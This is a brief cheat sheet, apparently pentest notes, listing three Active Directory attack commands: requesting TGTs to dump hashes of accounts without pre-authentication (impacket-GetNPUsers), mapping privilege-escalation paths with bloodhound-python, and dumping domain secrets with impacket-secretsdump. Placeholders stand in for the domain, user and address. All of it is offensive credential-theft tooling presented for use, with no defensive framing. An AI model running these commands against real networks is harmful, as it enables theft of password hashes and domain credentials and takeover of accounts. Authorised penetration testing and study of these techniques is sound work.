Request TGT & Dump User Hash
`impacket-GetNPUsers fqdn/user -dc-ip ipaddress -no-pass`

Bloodhound-Python PrivEsc Mapping
`bloodhound-python -ns ipaddress -d fqdn -u user -p pass`

Secrets Dump (Impacket)
`impacket-secretsdump domain/username@ipaddress` (Enter user password at prompt)


